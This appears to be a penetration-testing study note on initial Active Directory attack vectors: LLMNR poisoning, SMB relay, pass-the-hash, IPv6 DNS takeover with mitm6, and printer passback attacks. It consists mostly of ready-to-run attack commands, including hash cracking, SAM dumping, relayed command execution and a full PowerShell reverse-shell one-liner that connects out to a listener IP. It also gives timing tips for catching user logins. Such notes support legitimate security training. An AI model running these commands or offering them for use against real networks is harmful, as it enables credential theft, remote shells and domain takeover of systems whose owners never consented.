---
description: The fun part
---

# Attacking AD: Initial Attack Vectors

## Great Resource

{% embed url="https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa" %}

## LLMNR Poisoning

* <mark style="color:yellow;">Link Local Multicast Name Resolution</mark>
* This is a protocol that is used to <mark style="color:yellow;">identify hosts when DNS fails to do so</mark>
* Previously NBT-NS
* The <mark style="color:yellow;">flaw</mark> is that the services utilize a <mark style="color:yellow;">user's username and NTLMv2 when appropriately responded to</mark>

Example:

Victim and Server

<figure><img src="../../../../.gitbook/assets/image (4) (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

### How to exploit

Step 1: Run Responder

```
sudo responder -I tun0 -rdwv
```

* NOTE: This tool should seriously be the first thing that you run on an engagement
  * Especially during the morning hours when users are authenticating for the first time that day
  * Lunch is also a great time
* You should theoretically receive a hash once an event occurs

Step 2: Wait

Step 3: Obtain hash and proceed to Pass-The-Hash or take offline and crack!

Step 4: Password Cracking

```
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```

* Run these on your host for fast speeds

Finding Hashcat format:

```
hashcat --help | grep NTLM
```

## SMB Relay

* Instead of cracking hashes gathered by responder, we can relay those hashes to specific machines and potentially gain access

### Requirements

* <mark style="color:yellow;">SMB signing MUST BE DISABLED on the target</mark>
* Relayed user credentials must be admin on machine

### How to Exploit

Step 1: Make sure that <mark style="color:yellow;">SMB and HTTP servers are set to OFF</mark>

Step 2: Run <mark style="color:yellow;">Responder</mark>

```
sudo responder -I tun0 -rdwv
```

* You should see that SMB and HTTP are off

Step 3: Set up your relay -- <mark style="color:yellow;">impacket-ntlmrelayx</mark>

```
impacket-ntlmrelayx -tf targets.txt -smb2support
```

Step 4: Wait for an event to occur

Step 5: Upon success, you will see that a SAM file has been dumped

* SAM is a hash for a password
* We can take these offline and crack them
* Pass-The-Hash is available too

### Interactive SMB Shell

Start Interactive Session:

```
impacket-ntlmrelayx -tf targets.txt -smb2support -i

[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
```

Connect to Interactive Session:&#x20;

```
nc 127.0.0.1 11000
Type help for a list of commands
# help

# shares
ADMIN$
C$
IPC$
Share

# use C$
# ls

# use ADMIN$
# ls
```

### Execute a Reverse Shell or Meterpreter Listener

* Must generate payload with MSFVENOM!
* Get a shell in Metasploit/multihandler

```
impacket-ntlmrelayx -tf targets.txt -smb2support -e payload.exe
```

Execute a command:

<pre><code><strong>impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"</strong></code></pre>

You can also use a PowerShell Reverse Shell!

Start nc listener:

```
nc -lnvp 80
```

NTLMRELAYX:

```
impacket-ntlmrelayx -tf targets.txt -smb2support -c "$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

* Be sure to change the IP/port as needed!
* If it does not work, check firewall rules

## Identifying and Discovering Hosts w/ SMB Signing Disabled

* Remember, hosts with SMB signing disabled means that they are susceptible to SMB relay attacks
* NOTE: Servers will by default have SMB signing enabled and required
* NOTE: Clients will by default have SMB signing enabled but not required&#x20;

Nmap Syntax:

```
nmap --script=smb2-security-mode.nse -p445 192.168.10.0/24
```

* Upon running responder and obtaining a network event, you will get a hash

## Gaining Shell Access

* Here is where you need to start asking yourself "okay, we have credentials, how can we gain a shell?"
* Be sure to ALWAYS try and use multiple options before giving up!!!!
* First, attempt to use <mark style="color:yellow;">SMBEXEC</mark> or <mark style="color:yellow;">WMIEXEC</mark> at first&#x20;

### <mark style="color:yellow;">PSEXEC</mark>

Pass-The-Hash:

```
impacket-psexec htb.local/Administrator@10.10.10.10 --hashes 823452073d75b9d1cf70ebdf86c7f98e
```

Execute Command Remotely:

```
impacket-psexec htb.local/Administrator -p Password123 cmd.exe
```

or

```
impacket-psexec htb.local/Administrator:Password123@10.10.10.10
```

### <mark style="color:yellow;">WMIEXEC</mark>

Pass-The-Hash:

```
impacket-wmiexec htb.local/Administrator@10.10.10.10 -hashes aad3b435b51404eeaad3b435b51404ee:fb3b106896cdaa8a08072775fbd9afe9
```

### <mark style="color:yellow;">SMBEXEC</mark>

Obtain a Shell:

```
impacket-smbexec htb.local/Administrator:Password123@10.10.10.10
```

## IPv6 Attacks

* Know as Heath Adam's go-to attack!
* Machines typically utilize IPv4
* However, IPv6 is almost ALWAYS turned on
* Odds are, nothing on the network is in charge of DNS for IPv6

### How can we take advantage of this?

* We can spoof the DNS server and appear as the DNS server
  * We are now the DNS server
* Send me all of the IPv6 traffic to me
* <mark style="color:yellow;">When this happens, we can get authentication to the Domain Controller from SMB or LDAP</mark>
* We can use that information to create a new machine
* We can also perform LDAP relay with NTLM hashes and we can create an account using a tool known as <mark style="color:yellow;">ntlmrelayx</mark>

## IPv6 DNS Takeover via MITM6

### MITM6

{% embed url="https://github.com/dirkjanm/mitm6" %}

Step 1: Start MITM6

```
sudo mitm6 -d htb.local
```

Step 2: Set up a relay

```
impacket-ntlmrelayx -6 -t ldaps://<DC_IP> -wh fakewpad.htb.local -l LOOTME
```

Step 3: Wait for a reboot or other event

* Essentialy, IPv6 will send out a reply every 30 mins asking the network "who is my DNS server?"
* <mark style="color:yellow;">Upon success, you will see that it is succeeding and sending loot to /LOOTME</mark>

Step 4: CD into /LOOTME directory to obtain loot!

* You can then utilize Firefox to read these HTML files!
* Look for information such as descriptions and other things that are storing insecure cleartext passwords

<mark style="color:yellow;">NOTE: If an Administrator logs in, it will create a new user with administrative privileges and we can own the domain! This is all done through an ACL. It can also be used to restore and revert the damage done with a .restore file!</mark>

<mark style="color:yellow;">Not only can you add a new user, but a new computer!!!!! This is Delegation.</mark>

### Reference

{% embed url="https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/" %}

## "Passback" Attacks

* Stems from a bug that comes from a printer or some other strange device
* Essentially, you are looking for a device that connects to LDAP or some kind of SMB connection

Example w LDAP:

<figure><img src="../../../../.gitbook/assets/image (8) (4).png" alt=""><figcaption></figcaption></figure>

* <mark style="color:yellow;">If you were to change this LDAP address to your IP address, and you set up a netcat listener or Responder, you can capture cleartext credentials.</mark>
* <mark style="color:yellow;">It does not matter how secure or long the password is!</mark>
* <mark style="color:yellow;">Point the address back to yourself and you can grab it!</mark>

### Reference

{% embed url="https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack" %}

## Other Attack Vectors and Strategies

### Strategies for Engagement

1. <mark style="color:yellow;">Start off by running mitm6 or Responder</mark> -- 8 AM and Lunch -- Both need to be ran to assess for IPv6 (mitm6 IPv6 attacks) and LLMNR.
2. Run scans to generate traffic
3. If scans are taking too long, look for websites in scope (HTTP\_version)
4. Look for default credentials on web logins -- Printers, Jenkins, etc.
5. Make sure you are ALWAYS thinking outside the box!
6. Run a Nessus Vulnerability Scan
7. Identify clients with smb signing disabled with nmap (SMB Relay)
8. Low-hanging fruit first
